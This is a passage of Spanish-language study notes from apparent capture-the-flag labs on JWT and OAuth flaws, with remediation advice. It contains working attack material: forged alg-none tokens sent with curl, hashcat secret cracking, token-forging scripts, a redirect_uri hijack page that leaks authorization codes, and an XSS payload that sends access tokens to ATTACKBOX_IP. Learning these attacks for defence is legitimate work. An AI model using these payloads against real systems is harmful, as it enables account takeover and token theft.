Para explotar esta falla y escalar privilegios a administrador, el procedimiento técnico consiste en decodificar la carga útil, modificar el valor del campo `admin` a `1`, volver a codificar el objeto JSON en Base64URL, y enviar el token manipulado hacia la API conservando únicamente los dos primeros bloques y el punto terminal:

```bash
# Petición original de prueba de verificación sin firma
curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.' http://TARGET_IP/api/v1.0/example2?username=admin
```

Al enviar esta estructura mutilada, el servidor backend procesa el claim `admin: 1` sin verificar la autenticidad matemática del mensaje, devolviendo los privilegios y la bandera correspondiente al usuario administrador.

<br>

### 3.5. Vulnerabilidad: Degradación al Algoritmo `none` (*Algorithm None Downgrade*)
El estándar oficial de JWT contempla el soporte para un algoritmo denominado `none`, diseñado teóricamente para escenarios en los que la integridad del token ya ha sido validada por un canal seguro previo o en entornos de prueba locales. Cuando se especifica este algoritmo en el encabezado, el token se considera formalmente un token no firmado, por lo que la sección de la firma debe permanecer vacía.

El problema de seguridad radica en que muchas bibliotecas de backend antiguas o mal configuradas leen el algoritmo directamente desde el encabezado del token enviado por el cliente para decidir qué rutina de verificación ejecutar. Si la biblioteca no tiene una lista blanca estricta de algoritmos permitidos y el atacante altera el encabezado del JWT estableciendo `"alg": "none"`, `"alg": "None"`, o `"alg": "NONE"`, la función de verificación asume que el token no requiere comprobación criptográfica y devuelve un valor de éxito inmediato (`true`).

En el laboratorio práctico (Ejemplo 3), el ataque se ejecuta siguiendo estos pasos precisos:
Primero, se genera un nuevo encabezado JSON que declara la degradación del algoritmo: `{"alg": "none", "typ": "JWT"}`.
Segundo, se codifica dicho encabezado en Base64URL sin relleno de signos igual: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`.
Tercero, se modifica la carga útil para establecer privilegios administrativos: `{"username": "admin", "admin": 1}` y se codifica en Base64URL: `eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9`.
Cuarto, se concatenan ambos bloques separados por un punto y se añade un punto al final para representar la ausencia de firma: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.`.

```bash
# Envío del token degradado hacia la API para recuperar la bandera de administrador
curl -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.' http://TARGET_IP/api/v1.0/example3?username=admin
```

Para remediar esta vulnerabilidad, los desarrolladores deben configurar de forma explícita las bibliotecas de JWT (como `PyJWT`) para que rechacen categóricamente el algoritmo `none` y obliguen a definir una lista explícita de algoritmos válidos en la función de decodificación (por ejemplo, `algorithms=['HS256']`).

<br>

### 3.6. Vulnerabilidad: Secretos Simétricos Débiles y Descifrado Offline
En las implementaciones basadas en el algoritmo simétrico HS256, la integridad del token reposa exclusivamente en el secreto compartido utilizado para computar el hash HMAC. Si los desarrolladores seleccionan contraseñas cortas, términos comunes del diccionario o secretos extraídos de plantillas públicas de desarrollo (como `secret`, `password` o `123456`), un atacante que intercepte un único JWT emitido por la plataforma puede someter la firma a un ataque de fuerza bruta offline sin enviar una sola petición al servidor.

Debido a que el encabezado y la carga útil están en texto claro y la firma generada por el servidor está disponible, el proceso de descifrado consiste en aplicar HMAC-SHA256 sobre la cadena `header.payload` con sucesivas palabras candidatas de un diccionario hasta que el hash computado coincida exactamente con la firma del token.

En el laboratorio práctico (Ejemplo 4), se almacena el token interceptado dentro de un archivo local denominado `jwt.txt`. Posteriormente, se utiliza un diccionario especializado de secretos comunes de JWT (como listas de contraseñas de SecLists) y se ejecuta la herramienta Hashcat especificando el modo numérico correspondiente a firmas JWT HMAC-SHA256 (`-m 16500`) mediante un ataque de diccionario (`-a 0`).

```bash
# Ejecución del ataque de descifrado offline con Hashcat sobre el archivo jwt.txt
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
```

Una vez que Hashcat localiza la clave secreta y la imprime en pantalla, el atacante obtiene control absoluto sobre la emisión de tokens. Con el secreto en su poder, puede utilizar un script en Python o el portal `jwt.io` para forjar un nuevo token con `username: admin` y `admin: 1`, firmándolo legítimamente con la clave recuperada para autenticarse sin oposición.

```python
import jwt

secreto_recuperado = "secret123"
nuevo_payload = {"username": "admin", "admin": 1}
token_forjado = jwt.encode(nuevo_payload, secreto_recuperado, algorithm="HS256")
print(f"Token de Administrador Forjado: {token_forjado}")
```

<br>

### 3.7. Vulnerabilidad: Confusión de Algoritmos de Firma (RS256 a HS256)
El ataque de confusión de algoritmos representa una de las vulnerabilidades más sofisticadas en la gestión de JWT. Ocurre en sistemas donde el servidor original utiliza un algoritmo asimétrico como RS256, en el cual los tokens se firman con una clave privada RSA y se verifican con una clave pública RSA distribuida abiertamente en el servidor o accesible a través de puntos finales de certificados.

Si la biblioteca de verificación en el backend acepta de forma indistinta algoritmos simétricos y asimétricos sin validar rigurosamente la coincidencia de tipos, un atacante puede alterar el encabezado del token para cambiar el algoritmo de `RS256` a `HS256`. En un esquema HS256 normal, la función de verificación espera una clave secreta HMAC simétrica. Sin embargo, si el código del servidor pasa la clave pública RSA existente al método de validación creyendo que la operación es siempre asimétrica, la biblioteca tratará los bytes textuales de la clave pública RSA (en formato PEM) como si fueran el secreto simétrico HMAC.

Dado que la clave pública RSA no es confidencial y puede ser obtenida por el atacante directamente del servidor web, este puede firmar localmente un token forjado utilizando el algoritmo simétrico HS256 y empleando el archivo de la clave pública como secreto. Cuando el backend recibe el token, lee el encabezado `HS256`, aplica HMAC-SHA256 utilizando su propia clave pública como secreto y encuentra una coincidencia matemática exacta, validando la solicitud como legítima.

En el laboratorio práctico (Ejemplo 5), el auditor obtiene la clave pública entregada por la aplicación y utiliza el siguiente script en Python (`forge.py`) para eludir los parches de comprobación de tipos de PyJWT y generar el token malicioso:

```python
import jwt

# Lectura de la clave pública conocida del servidor
with open("public.pem", "r") as f:
    public_key = f.read()

payload = {"username": "admin", "admin": 1}

# Forjado del token configurando HS256 y pasando la clave pública como secreto HMAC
token_forjado = jwt.encode(payload, public_key, algorithm="HS256")
print(f"Token forjado por confusión de algoritmos: {token_forjado}")
```

Al inyectar este token en la cabecera `Authorization: Bearer` de la solicitud, la API valida la firma y concede los privilegios de administrador requeridos para recuperar la bandera.

<br>

### 3.8. Vulnerabilidad: Ciclo de Vida y Falta de Caducidad de Tokens
A diferencia de las cookies de sesión tradicionales, que pueden ser eliminadas de forma centralizada en el servidor en cualquier momento, los JWT son autónomos y no se comunican de vuelta con el backend una vez emitidos. Por esta razón, el control de la vida útil del token descansa fundamentalmente en el claim registrado `exp` (*Expiration Time*), que define en formato de marca de tiempo Unix el momento exacto en el que el token deja de ser válido.

Si los desarrolladores omiten por completo la inclusión del claim `exp`, la inmensa mayoría de las bibliotecas de procesamiento validarán el token indefinidamente en el futuro siempre que la firma coincida. Si un atacante intercepta un token sin fecha de expiración, obtendrá persistencia permanente en la cuenta de la víctima sin que esta pueda revocar el acceso cerrando la sesión. Asimismo, si el valor configurado para `exp` es excesivamente holgado (por ejemplo, meses o años para un sistema crítico), la ventana de exposición ante incidentes de robo de credenciales se vuelve inaceptable.

En el laboratorio práctico (Ejemplo 6), el análisis del token interceptado confirma la ausencia total del claim `exp`. Esto permite que un token capturado en un momento arbitrario continúe funcionando sin interrupciones. La solución arquitectónica exige programar la inclusión del claim `exp` con ventanas de validez reducidas (de 5 a 15 minutos) e implementar un mecanismo complementario de tokens de refresco (*Refresh Tokens*) gestionados con almacenamiento en base de datos para controlar la revocación forzosa.

### 3.9. Vulnerabilidad: Retransmisión entre Servicios y el Claim de Audiencia (*Audience Claim*)
En infraestructuras corporativas complejas basadas en Arquitecturas Orientadas a Servicios (SOA) o Microservicios, es habitual disponer de un único servidor de identidad o proveedor de autenticación centralizado (como Keycloak, Okta o Auth0) que emite tokens JWT utilizados para autenticarse en múltiples aplicaciones independientes dentro de la organización. Sin embargo, no todos los usuarios disponen del mismo nivel de autorización en todas las aplicaciones del ecosistema.

Para regular a qué servicios concretos está destinado un token, el estándar define el claim registrado `aud` (*Audience*), cuyo valor contiene el identificador o URL del servicio receptor previsto. La vulnerabilidad de retransmisión entre servicios (*Cross-Service Relay Attack*) ocurre cuando un servicio receptor (por ejemplo, `appA`) valida la firma del token pero omite comprobar si el campo `aud` coincide con su propia identidad.

Si un usuario dispone de privilegios de usuario raso en la aplicación `appA`, pero cuenta con permisos de administrador legítimos en otra herramienta interna `appB`, el servidor de identidad emitirá un JWT para `appB` que incluye los claims `admin: true` y `aud: appB`. Si la aplicación `appA` no valida la audiencia, el usuario puede tomar el token emitido para `appB` y enviarlo hacia `appA`. Al encontrar una firma válida y el claim `admin: true`, `appA` asumirá erróneamente que el usuario es un administrador de su propio sistema, consumando una escalada de privilegios cruzada.

En el laboratorio práctico (Ejemplo 7), se interactúa con dos puntos finales: `example7_appA` y `example7_appB`. Al autenticarse solicitando acceso para la aplicación `appB`, se obtiene un token con privilegios elevados y audiencia destinada a `appB`. Al enviar dicho token hacia el endpoint `example7_appA`, se comprueba que `appA` carece de verificación sobre el claim `aud`, procesando el rol de administrador y permitiendo la captura inmediata de la bandera final del laboratorio.

<br>

---

<br>

<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/62a7685ca6e7ce005d3f3afe-1721736252781" width="60px" align="absmiddle">
  <span> Vulnerabilidades en OAuth (OAuth Vulnerabilities)</span>
</h2>

### 4.1. Conceptos Fundamentales de OAuth 2.0 y Arquitectura de Roles

El protocolo OAuth 2.0 es el estándar de la industria para la delegación de autorización en entornos web modernos. A diferencia de los esquemas tradicionales donde un usuario debe confiar sus credenciales directamente a cada servicio, OAuth permite a los usuarios compartir recursos específicos alojados en un servidor con aplicaciones de terceros sin exponer en ningún momento su contraseña principal. Para comprender a fondo tanto el funcionamiento del protocolo como los vectores de ataque asociados, es indispensable asimilar su modelo de actores mediante una analogía práctica de la vida cotidiana, como pedir y pagar café a través de una aplicación móvil corporativa conectada a una cafetería externa.

El Propietario del Recurso (*Resource Owner*) es la persona física o entidad que posee los datos y tiene la capacidad legal y técnica de otorgar acceso a los mismos. En la analogía del servicio de cafetería, el cliente que acude al local es el propietario del recurso, ya que tiene el control exclusivo sobre los datos de su perfil, su saldo acumulado y su historial de compras.

El Cliente (*Client*) representa la aplicación web o móvil que actúa como intermediaria y solicita acceso a los datos protegidos en nombre del propietario del recurso para prestar un servicio añadido. En este escenario, la aplicación web externa del bistró o restaurante asociado actúa como el cliente de OAuth, ya que necesita interactuar con el sistema de la cafetería para validar pagos y consultar pedidos.

El Servidor de Autorización (*Authorization Server*) es el componente central de seguridad responsable de verificar la identidad del propietario del recurso y recabar su consentimiento explícito para, acto seguido, emitir tokens criptográficos al cliente. En el ecosistema planteado, el backend central de autenticación de la cafetería desempeña este rol, asegurando que la aplicación externa solo reciba permisos válidos si el usuario aprueba la transacción.

El Servidor de Recursos (*Resource Server*) es la infraestructura técnica o interfaz de programación (API) que almacena los datos protegidos y atiende solicitudes HTTP autorizadas que incluyan un token de acceso válido. En nuestro ejemplo, la base de datos y la API de la cafetería que gestionan el saldo de la tarjeta de fidelización y los pedidos pendientes constituyen el servidor de recursos.

La Concesión de Autorización (*Authorization Grant*) es una credencial temporal e intermedia que representa el consentimiento del usuario y que la aplicación cliente utiliza ante el servidor de autorización para canjearla por un token de acceso definitivo. Existen diversas modalidades de concesión que se adaptan a la arquitectura de la aplicación demandante.

El Token de Acceso (*Access Token*) es una credencial digital autónoma o referencial emitida por el servidor de autorización que otorga derechos de acceso restringidos y de duración limitada a recursos específicos en nombre del usuario. Se transporta habitualmente en las cabeceras HTTP de las peticiones a la API bajo el formato de portador (*Bearer Token*), evitando que el usuario deba reautenticarse constantemente.

El Token de Actualización (*Refresh Token*) es una credencial complementaria y de larga duración concedida a clientes seguros para solicitar nuevos tokens de acceso cuando el actual haya expirado, manteniendo la sesión operativa sin interrumpir al usuario con peticiones de contraseña repetitivas.

El URI de Redirección (*Redirect URI*) es el parámetro obligatorio que especifica la dirección web exacta a la que el servidor de autorización debe remitir el navegador del usuario una vez que este haya aprobado o rechazado la autorización. Debe coincidir estrictamente con las direcciones previamente registradas en la configuración de la aplicación cliente para impedir desvíos fraudulentos.

El Alcance (*Scope*) define el conjunto granular de permisos que la aplicación cliente solicita sobre los datos del usuario, limitando el acceso al mínimo privilegio necesario, como por ejemplo solicitar únicamente permiso para leer el perfil básico sin derecho a emitir transferencias de pago.

El Parámetro de Estado (*State Parameter*) es un valor aleatorio y criptográficamente impredecible generado por el cliente que acompaña la petición inicial de autorización y que debe devolverse intacto en la respuesta. Su presencia es fundamental para mitigar ataques de falsificación de peticiones en sitios cruzados (CSRF) garantizando que la respuesta recibida pertenezca a la misma transacción que el cliente inició.

Los Puntos Finales de Autorización y de Token (*Endpoints*) delimitan las dos etapas de interacción del protocolo. El punto final de autorización gestiona la interfaz interactiva donde el usuario inicia sesión y otorga su consentimiento en el navegador, mientras que el punto final de token procesa solicitudes automáticas de máquina a máquina para intercambiar códigos de autorización por credenciales de acceso.

<br>

### 4.2. Tipos de Concesión en OAuth 2.0 (Grant Types)

La especificación OAuth 2.0 define diferentes flujos de concesión de autorización diseñados para acomodar diversas arquitecturas de software y modelos de confianza, variando sustancialmente en su robustez criptográfica y superficie de ataque.

El Flujo de Código de Autorización (*Authorization Code Grant*) es el mecanismo estándar y más seguro del protocolo, recomendado para aplicaciones con lógica ejecutada en el servidor (como arquitecturas desarrolladas en PHP, Java, Python o ASP.NET) donde el secreto del cliente (*Client Secret*) puede resguardarse de forma segura en el backend sin exponerse a los usuarios. En este flujo, el navegador del usuario solo recibe un código de autorización temporal, el cual se transfiere posteriormente de servidor a servidor al punto final de token para canjearlo por el token de acceso. Esta separación física de canales impide que el token de acceso quede expuesto en el historial del navegador o en los registros de tráfico del cliente web, además de admitir de forma nativa el uso de tokens de actualización para mantener la persistencia.

El Flujo Implícito (*Implicit Grant*) fue concebido originalmente para aplicaciones de una sola página (SPA) y aplicaciones móviles que carecían de backend propio y ejecutaban todo su código en el navegador o en el dispositivo del usuario. A diferencia del flujo de código, el servidor de autorización devuelve el token de acceso directamente en el fragmento de la URL (tras el carácter almohadilla `#`) inmediatamente después de que el usuario otorga su consentimiento, suprimiendo la fase intermedia del código de autorización. Esta aceleración en el proceso introduce graves deficiencias de seguridad, ya que el token de acceso queda expuesto en el agente de usuario, es accesible para cualquier script que se ejecute en el contexto de la página, queda registrado en los historiales de navegación y no admite tokens de actualización. Por estos motivos, las recomendaciones actuales y las futuras especificaciones de OAuth 2.1 prohíben taxativamente el uso de este flujo.

El Flujo de Credenciales de Contraseña del Propietario del Recurso (*Resource Owner Password Credentials Grant*) permite que el usuario ingrese directamente su nombre de usuario y contraseña en la interfaz de la aplicación cliente, tras lo cual el cliente envía dichas credenciales al servidor de autorización a cambio de un token. Este flujo está estrictamente desaconsejado para aplicaciones de terceros, ya que anula el principio fundamental de no divulgación de credenciales de OAuth, limitándose exclusivamente a clientes de primera parte altamente confiables y a procesos de migración de aplicaciones heredadas, habiendo sido igualmente marcado como obsoleto en OAuth 2.1.

El Flujo de Credenciales de Cliente (*Client Credentials Grant*) se emplea en comunicaciones automatizadas de máquina a máquina o microservicios donde no existe un usuario interactivo. La propia aplicación cliente utiliza su identificador y su secreto corporativo para autenticarse directamente ante el servidor de autorización y obtener un token de acceso que le permita consumir recursos de su propia incumbencia.

<br>

### 4.3. Flujo de Trabajo Detallado de Autorización (OAuth Flow Paso a Paso)

Para ilustrar de forma tangible la interacción de todos los elementos técnicos de un flujo OAuth 2.0 estándar basado en Código de Autorización, se analiza el entorno de laboratorio práctico donde la plataforma central de la cafetería (`http://coffee.thm:8000`) ejerce como proveedor de identidad y el portal del bistró (`http://bistro.thm:8000`) actúa como aplicación cliente.

El ciclo comienza cuando el usuario interactúa con la aplicación cliente e inicia sesión mediante la opción federada de la cafetería. El cliente genera una redirección HTTP 302 que remite el navegador del usuario al punto final de autorización del proveedor OAuth. Esta solicitud de autorización incorpora en sus parámetros de consulta la variable `response_type=code` para indicar que espera un código temporal, el parámetro `client_id` para identificar de forma unívoca a la aplicación cliente, la dirección `redirect_uri` que señala a dónde debe responder el servidor tras la validación, el valor `scope` que especifica los permisos requeridos (como consultar el perfil de usuario), y el parámetro `state` que contiene un identificador pseudoaleatorio para validar la sesión de retorno.

```http
GET /accounts/login/?next=/o/authorize/%3Fclient_id%3Dzlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt%26response_type%3Dcode%26redirect_uri%3Dhttp%3A//bistro.thm%3A8000/oauthdemo/callback HTTP/1.1
Host: coffee.thm:8000
User-Agent: Mozilla/5.0
```

En la segunda fase, el usuario aterriza en el servidor de autorización y se autentica mediante sus credenciales (por ejemplo, el usuario legítimo `victim:victim123`). Acto seguido, el servidor le presenta una pantalla de consentimiento donde se detallan explícitamente los recursos a los que la aplicación cliente solicita acceso. Si el usuario aprueba la concesión, el servidor de autorización genera un código de autorización temporal de un solo uso.

En la tercera fase, el servidor de autorización emite una respuesta de redirección que envía al navegador del usuario de vuelta a la dirección `redirect_uri` registrada previamente por el bistró, adjuntando en los parámetros de consulta el código generado y el parámetro de estado original.

```http
HTTP/1.1 302 Found
Location: http://bistro.thm:8000/oauthdemo/callback?code=AuthCode123456&state=xyzSecure123
```

En la cuarta fase, el backend del bistró recibe la solicitud de retorno, comprueba que el valor de `state` recibido coincida exactamente con el generado en la solicitud original para prevenir ataques de CSRF, y procede a realizar una petición interna POST de servidor a servidor hacia el punto final de token del proveedor (`/o/token`). En este mensaje, el cliente transmite el parámetro `grant_type=code`, el código de autorización recibido, la misma `redirect_uri` utilizada en el inicio y sus credenciales de cliente (`client_id` y `client_secret`).

```http
POST /o/token/ HTTP/1.1
Host: coffee.thm:8000
Content-Type: application/x-www-form-urlencoded

grant_type=code&code=AuthCode123456&redirect_uri=http%3A%2F%2Fbistro.thm%3A8000%2Foauthdemo%2Fcallback&client_id=zlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt&client_secret=SECRETO_DEL_CLIENTE
```

En la quinta y última fase, el servidor de autorización verifica la autenticidad de las credenciales del cliente, la vigencia del código de autorización y la coincidencia del URI de redirección. Si todo es correcto, destruye el código de autorización para evitar ataques de repetición y devuelve una estructura JSON que contiene el `access_token`, el tipo de token (habitualmente `Bearer`), el tiempo de vida en segundos (`expires_in`) y, de forma opcional, un `refresh_token`. Con este token de acceso en su poder, el backend del bistró puede consumir las APIs protegidas del servidor de recursos de la cafetería adjuntando la cabecera `Authorization: Bearer <token>` en cada consulta.

```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIs...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "tGzv3JOkF0XG5Qx2TlKWIA"
}
```

<br>

### 4.4. Descubrimiento y Huella Digital de Servicios OAuth

El reconocimiento técnico de la presencia de flujos OAuth y la identificación del software específico que gestiona la autenticación son pasos preliminares obligatorios durante una auditoría web.

La primera señal evidente de implementación de OAuth reside en los elementos de la interfaz de usuario, especialmente en los formularios de inicio de sesión o registro que ofrecen botones para identificarse mediante proveedores externos como Google, GitHub, Microsoft o redes sociales. Estos botones suelen invocar enlaces que redirigen inmediatamente al usuario fuera del dominio principal hacia la plataforma de autorización correspondiente.

La confirmación certera de un flujo OAuth se realiza mediante la inspección del tráfico HTTP con herramientas de proxy como Burp Suite, prestando especial atención a las respuestas de redirección 302 hacia dominios de autorización. Estas solicitudes se caracterizan por una estructura de consulta reconocible que incorpora obligatoriamente parámetros como `response_type`, `client_id`, `redirect_uri`, `scope` y `state`. La presencia de `response_type=code` confirma la adopción del flujo de código de autorización, mientras que la presencia de `response_type=token` evidencia la utilización del flujo implícito vulnerable.

Para identificar el framework o biblioteca específica que respalda la solución de OAuth en el servidor de destino, el auditor debe analizar los nombres de los endpoints, las cabeceras HTTP de respuesta y los comentarios del código fuente. Por ejemplo, implementaciones basadas en Python utilizan frecuentemente Django OAuth Toolkit, reconocible por sus rutas predeterminadas `/o/authorize/` o `/oauth/authorize/` y `/o/token/`. En el ecosistema Node.js, las aplicaciones que emplean Passport.js suelen configurar rutas del estilo `/auth/provider/callback`. En entornos Java empresariales, Spring Security OAuth utiliza endpoints como `/oauth/authorize` y `/oauth/token`. La provocación intencionada de fallos en el paso de parámetros (como enviar cadenas vacías en `client_id`) a menudo provoca que el servidor devuelva mensajes de error de depuración o trazas de ejecución que revelan la versión exacta de la biblioteca en uso.

<br>

### 4.5. Explotación de Redirección Insegura y Secuestro de Tokens (Redirect URI Manipulation)

El parámetro `redirect_uri` constituye la columna vertebral de la seguridad en la transmisión de credenciales dentro del flujo OAuth. Si el servidor de autorización falla en validar este parámetro contra una lista blanca estricta e inmutable de URLs predeterminadas, los atacantes pueden manipular el destino de la redirección para desviar códigos de autorización o tokens de acceso hacia servidores bajo su control.

La raíz de esta vulnerabilidad reside en configuraciones permisivas del servidor de autorización, tales como la validación parcial por coincidencia de prefijos, el uso de expresiones regulares defectuosas o la admisión de subdominios completos sin contemplar la posibilidad de que uno de ellos aloje una vulnerabilidad de redirección abierta o se encuentre comprometido por un adversario.

En el escenario práctico del laboratorio, el servidor de autorización de la cafetería (`coffee.thm:8000`) tiene registrado como destino legítimo un subdominio de desarrollo del bistró (`dev.bistro.thm:8002`). Un atacante que comprometa este subdominio secundario o descubra en él una funcionalidad para subir o reflejar código HTML puede desviar el flujo de autorización de usuarios desprevenidos.

Para preparar el ataque, el adversario diseña una página web maliciosa denominada `redirect_uri.html` que contiene un formulario invisible diseñado para remitir a la víctima al endpoint de inicio de sesión federado de la cafetería, pero sobreescribiendo el parámetro `redirect_uri` para que apunte hacia un script de captura alojado en su propio servidor (`http://dev.bistro.thm:8002/malicious_redirect.html`).

```html
<!-- Archivo redirect_uri.html alojado por el atacante -->
<html>
  <body>
    <form id="oauth_form" action="http://coffee.thm:8000/oauthdemo/oauth_login/" method="GET">
      <input type="hidden" name="redirect_uri" value="http://dev.bistro.thm:8002/malicious_redirect.html" />
      <input type="submit" value="Iniciar sesión a través de OAuth" />
    </form>
  </body>
</html>
```

En el extremo receptor del servidor malicioso, el archivo `malicious_redirect.html` contiene código JavaScript diseñado para extraer de forma inmediata el parámetro `code` de la URL tras completarse la redirección del proveedor y enviarlo a la base de datos o consola de captura del atacante.

```html
<!-- Archivo malicious_redirect.html -->
<script>
  var queryParams = new URLSearchParams(window.location.search);
  var stolenCode = queryParams.get('code');
  if (stolenCode) {
    var exfil = new Image();
    exfil.src = "http://dev.bistro.thm:8002/log_code?code=" + encodeURIComponent(stolenCode);
    window.location.href = "http://bistro.thm:8000/error_login";
  }
</script>
```

Cuando la víctima hace clic en el enlace malicioso proporcionado por el atacante mediante ingeniería social, accede a la página de la cafetería e introduce sus credenciales legítimas (`victim:victim123`). Como el servidor de autorización valida únicamente que el dominio destino pertenezca genéricamente a `dev.bistro.thm`, genera el código de autorización y redirige a la víctima directamente al script del atacante.

Con el código de autorización secuestrado en su poder, el atacante procede de inmediato a canjearlo ante el punto final de callback legítimo de la aplicación bistró (`http://bistro.thm:8000/oauthdemo/callbackforflag/?code=AuthCodeSecuestrado`). Debido a que el bistró no tiene forma de discernir quién transmitió el código al navegador mientras el código sea criptográficamente válido, el servidor canjea el código por el token de acceso oficial de la víctima y le entrega al atacante el control absoluto de la cuenta.

La remediación indispensable frente a esta amenaza exige la implementación de una validación estricta de cadenas idénticas (*exact string matching*), prohibiendo terminantemente la coincidencia de prefijos laxos, expresiones regulares con comodines y rutas dinámicas. Cada aplicación cliente debe registrar explícitamente sus URLs absolutas de retorno en el panel de control del servidor de autorización, y cualquier discrepancia de un solo carácter en la solicitud debe resultar en el rechazo inmediato de la transacción.

<br>

### 4.6. Falsificación de Peticiones en Sitios Cruzados en OAuth (OAuth CSRF por State Ausente o Débil)

El parámetro `state` actúa como una defensa anti-CSRF imprescindible en los protocolos de autorización federada. Su propósito es vincular la solicitud inicial emitida por el navegador de un usuario con la respuesta de redirección que posteriormente devuelve el servidor de autorización. Cuando una implementación de OAuth omite el parámetro `state`, utiliza un valor constante o emplea una secuencia predecible, el flujo queda desprotegido frente a ataques de fijación y secuestro de enlace de cuentas.

La dinámica del ataque de CSRF en OAuth no busca robar el código de autorización de la víctima, sino lograr exactamente lo contrario: forzar a que la víctima procese y canjee un código de autorización perteneciente al atacante en su propia sesión de cliente. Esto provoca que la cuenta del atacante en el proveedor de OAuth quede vinculada a la cuenta de la aplicación cliente que la víctima tiene abierta en ese instante.

En el laboratorio práctico, la aplicación de gestión de contactos `mycontacts.thm:8080` permite a los usuarios sincronizar su libreta de direcciones conectándola con su perfil de `CoffeeShopApp`. Al inspeccionar la solicitud generada al pulsar el botón de sincronización, se observa que la URL de autorización carece por completo del parámetro `state`.

```http
http://coffee.thm:8000/o/authorize/?response_type=code&client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&redirect_uri=http%3A%2F%2Fcoffee.thm%2Fcsrf%2Fcallbackcsrf.php
```

Para explotar esta omisión, el atacante inicia sesión con su propia cuenta en el proveedor de autorización (`attacker:tesla@123`) y comienza el flujo de sincronización de contactos. Sin embargo, en lugar de permitir que su navegador canjee el código recibido en el callback, el atacante intercepta la respuesta de redirección y extrae su propio código de autorización válido sin consumirlo.

A continuación, el adversario prepara la carga útil maliciosa construyendo un enlace dirigido hacia el callback de la aplicación cliente que incorpora su propio código: `http://bistro.thm:8080/csrf/callbackcsrf.php?code=CODIGO_DEL_ATACANTE`.

El atacante envía este enlace a la víctima a través de correo electrónico o lo inserta en un elemento invisible en un sitio web de terceros. Cuando la víctima, que mantiene una sesión activa en `mycontacts.thm:8080`, pincha en el enlace o carga la página maliciosa, su navegador envía automáticamente la petición de callback junto con las cookies de sesión de la víctima.

Dado que la aplicación cliente no valida ningún token de estado para verificar si esa petición de retorno corresponde a un flujo iniciado por la víctima, asume que se trata de una autorización válida, canjea el código del atacante por un token de acceso y vincula la cuenta de CoffeeShopApp del atacante a la cuenta de la víctima. Como consecuencia inmediata de esta sincronización cruzada, todos los contactos y registros sensibles de la víctima se transmiten de forma transparente hacia la cuenta de la cafetería controlada por el atacante.

Para prevenir de forma definitiva este vector de ataque, la especificación OAuth exige que el cliente genere un token pseudoaleatorio criptográficamente seguro, lo almacene temporalmente en la sesión del usuario del navegador (por ejemplo en una cookie con atributos de protección) y lo envíe en el parámetro `state` al servidor de autorización. Al procesar la respuesta en el callback, el cliente debe comparar obligatoriamente el valor del parámetro `state` devuelto con el guardado en la sesión local; si los valores no coinciden o el parámetro está ausente, la petición debe cancelarse inmediatamente.

<br>

### 4.7. Explotación del Flujo de Concesión Implícita (Implicit Grant) mediante XSS

El flujo de concesión implícita expone intrínsecamente el token de acceso en el entorno del cliente al retornarlo en el fragmento de la URL (`Location: http://cliente.thm/callback#access_token=TOKEN&token_type=Bearer`). Dado que la especificación HTTP establece que los fragmentos de URL no se envían al servidor en las cabeceras de petición sino que permanecen en el contexto del navegador, cualquier vulnerabilidad de Cross-Site Scripting (XSS) presente en el origen del cliente permite a un atacante extraer y exfiltrar el token de forma instantánea.

En el entorno de evaluación de `factbook.thm:8080`, la aplicación permite a los usuarios sincronizar estados desde la plataforma `CoffeeShopApp` utilizando el flujo implícito. Tras la autenticación de la víctima en el proveedor, el navegador es redirigido a la página local `callback.php` portando el token en el fragmento de la URL. Dicha página dispone de un formulario interactivo para actualizar el estado del usuario mediante peticiones AJAX, el cual presenta una vulnerabilidad crítica de inyección de código XSS al reflejar y almacenar entradas sin desinfección ni codificación de caracteres.

Para orquestar la captura y robo del token, el atacante inicia en su máquina AttackBox un servidor HTTP en segundo plano escuchando en el puerto 8081 mediante el comando de Python correspondiente.

```bash
python3 -m http.server 8081
```

Seguidamente, el atacante aprovecha el formulario vulnerable de estados para inyectar un payload en JavaScript diseñado específicamente para acceder al identificador de fragmento del documento (`window.location.hash`), aislar la cadena correspondiente al parámetro `access_token` y transmitirla hacia su servidor oyente a través de la instanciación de un objeto de imagen.

```html
<script>
  var fragment = window.location.hash.substr(1);
  var params = fragment.split('&').reduce(function(res, item) {
    var parts = item.split('=');
    res[parts[0]] = parts[1];
    return res;
  }, {});
  var accessToken = params['access_token'];
  if (accessToken) {
    var exfil = new Image();
    exfil.src = 'http://ATTACKBOX_IP:8081/steal_token?token=' + encodeURIComponent(accessToken);
  }
</script>
```

Cuando un usuario legítimo se autentica en la aplicación a través de OAuth y aterriza en la página de retorno portando su token de acceso en el fragmento, el script inyectado se ejecuta de inmediato en el contexto del navegador. El script procesa la variable `window.location.hash`, parsea el token de portador y desencadena una petición HTTP hacia la IP del atacante conteniendo el token robado en la cadena de consulta.

Al inspeccionar los registros del servidor HTTP de Python, el atacante observa la solicitud entrante y recupera el token de acceso en texto claro, adquiriendo la capacidad de consultar y modificar cualquier recurso del usuario en el servidor de la cafetería suplantando su identidad.

La remediación arquitectónica ante esta debilidad consiste en abandonar por completo el uso del flujo implícito en favor del flujo de Código de Autorización reforzado con PKCE (*Proof Key for Code Exchange*), asegurando al mismo tiempo la implementación de defensas robustas contra XSS mediante codificación contextual de salida y políticas estrictas de seguridad de contenido (CSP).

<br>

### 4.8. Vulnerabilidades Adicionales y la Evolución hacia OAuth 2.1

Más allá de los vectores de explotación analizados en los flujos principales, la auditoría integral de sistemas OAuth exige evaluar debilidades complementarias que comprometen la custodia de las sesiones a largo plazo.

